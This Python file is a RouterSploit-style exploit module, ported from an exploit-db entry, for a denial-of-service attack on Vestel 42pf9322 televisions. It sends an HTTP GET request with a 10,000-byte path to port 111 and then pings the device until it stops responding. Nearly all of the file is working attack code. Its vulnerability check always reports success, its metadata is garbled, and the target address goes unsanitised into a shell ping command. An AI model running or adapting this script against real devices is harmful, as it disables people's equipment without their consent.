#!/usr/bin/python

# Exploit Title: Vestel TV Denial of Service (DoS) Attack
# Exploit Author: HackerSofi - hackersofi@gmail.com 
# Date: 12/09/2013
# CVE Number: 
# Vendor Homepage: http://www.vestel.com/
# Description: Some TV's Has Communication Port. Vestel 42pf9322 Models TV Using Port 0f 111 For Network Communications. 
#              If You Launch An Attack 0n The Communication Port, Tv System Will Be Crashes. 
# Special Thanks : DaTaMaN

 
import http.client
import sys
import os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(111, "Target HTTP port")



    __info__ = {

        "name": "28271",
        "description": "Some TV's Has Communication Port. Vestel 42pf9322 Models TV Using Port 0f 111 For Network Communications. "
                       "If You Launch An Attack 0n The Communication Port, Tv System Will Be Crashes.  ",
        "authors": (
            "",  # vulnerability discovery
            "###",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/5054",
        ),
        "devices": (
            "Vestel","28271"
        ),

    }
    
    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")

            print_status("  ***************************************************************************************")
            print_status("   Author: HackerSofi - hackersofi@gmail.com \n")
            print_status("   Exploit: Denial of Service (DoS) attack\n")
            print_status("   Description:\n")
            print_status("   Some TV's Has Communication Port. Vestel 42pf9322 Models TV Using Port 0f 111 For Network Communications. ")
            print_status("   If You Launch An Attack 0n The Communication Port, Tv System Will Be Crashes.\n ")
            print_status("   Special Thanks : DaTaMaN ")
            print_status("  ***************************************************************************************\n")

            # Sends The Request
            print_status("  Sending The Request...\n")
            try:
                conn = http.client.HTTPConnection(self.target,self.port)
                conn.request("GET", "A"*10000)
                conn.close()
            except:
                print_error("Exploit failed - connect failed")

            # Checks The Response
            print_status("  Checking The Status... (CTRL+Z to stop)\n")
            response = 0
            while response == 0:
              response = os.system("ping -c 1 " + self.target + "> /dev/null 2>&1")
              if response != 0:
                print_success("  Attack Successful!\n")

        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        
        return True
